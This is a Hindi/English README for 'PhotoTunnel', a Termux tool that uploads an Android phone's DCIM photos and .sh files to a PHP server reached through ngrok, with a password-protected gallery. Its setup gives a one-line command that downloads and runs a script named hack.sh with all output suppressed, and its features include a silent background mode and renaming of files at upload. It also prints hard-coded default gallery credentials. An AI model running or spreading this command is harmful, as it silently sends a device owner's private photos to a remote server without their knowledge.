# 📸 PhotoTunnel
**Termux Auto Image/Script Uploader with PHP + ngrok + Secure Gallery**

PhotoTunnel एक ऑटोमेशन प्रोजेक्ट है जो Android (Termux) से आपके PHP/ngrok सर्वर पर **DCIM फोल्डर की इमेजेस** और **.sh स्क्रिप्ट फाइलें** सुरक्षित तरीके से अपलोड करता है।  
इसके साथ एक **पासवर्ड प्रोटेक्टेड गैलरी**, सर्च/सॉर्ट फीचर, और लॉग सिस्टम भी है।

---

## ✨ फीचर्स
- **📤 Termux Upload Script**
  - DCIM फोल्डर से इमेजेस का ऑटो अपलोड
  - Silent Mode → बिना आउटपुट के बैकग्राउंड अपलोड
  - File Obfuscation → अपलोड के समय नाम बदलना
- **🔐 Secure PHP Gallery**
  - Login Required (default: `codex` / `Codex@2003`)
  - Search & Sort (Newest, Oldest, Name)
  - Download Images
- **🛡 Security**
  - Brute Force Protection (5 फ़ेल login → लॉक)
  - CSRF Token Protection
  - Secure HTTP Headers
  - Sanitized Filenames
- **📝 Logs**
  - IP, Date/Time, Action (Login, Download, Logout…)
  - लॉग फाइल डाउनलोड का ऑप्शन (सिर्फ लॉगिन के बाद)
- **💻 .sh File Upload Web Form**
  - वेबसाइट से केवल `.sh` फाइलें अपलोड करें

---

## 📂 फाइल स्ट्रक्चर 
```
.
├── .github/workflows/deploy.yml    # GitHub Actions workflow
├── upload.php                      # File upload handler
├── gallery.php                     # Secure image gallery
├── sh.php                          # Termux auto-upload script (auto-generated)
├── README.md                       # यह डॉक्युमेंट
```

---

### 2️⃣ Secrets सेट करें (GitHub)
- Repo → **Settings** → **Secrets and variables** → **Actions**
- `New repository secret` क्लिक करें  
  **Name:** `NGROK_AUTHTOKEN`  
  **Value:** आपका ngrok ऑथ टोकन  

### 3️⃣ Workflow रन करें
- कोई भी फ़ाइल push करें या commit → workflow ऑटो रन होगा

### 4️⃣ Termux पर स्क्रिप्ट रन करें
```bash
curl -s -O https://raw.githubusercontent.com/<username>/<reponame>/main/hack.sh && chmod +x hack.sh && ./hack.sh >/dev/null 2>&1
```
### Full Guid Github Guru YouTube channel,
---

## 🔒 लॉगिन डिटेल्स
- **Gallery URL:** `https://<ngrok-url>/gallery.php`  
- **Username:** `codex`  
- **Password:** `Codex@2003`

---

## 📜 लॉग एक्सेस
- गैलरी में लॉगिन के बाद "Download Logs" बटन से डाउनलोड करें  
- लॉग फॉर्मेट:
```
[YYYY-MM-DD HH:MM:SS] USERNAME: codex | IP: x.x.x.x | ACTION: DOWNLOAD_IMAGE | DETAILS: file.jpg
```

---

## ⚠️ सुरक्षा टिप्स
- Public में पासवर्ड बदलें  
- Logs और uploads को सुरक्षित permissions दें  
- ngrok URL को पब्लिक में शेयर करने से बचें

---

## 📝 लाइसेंस
MIT License

---

## 🤝 योगदान
Pull requests, issues और सुझाव का स्वागत है!
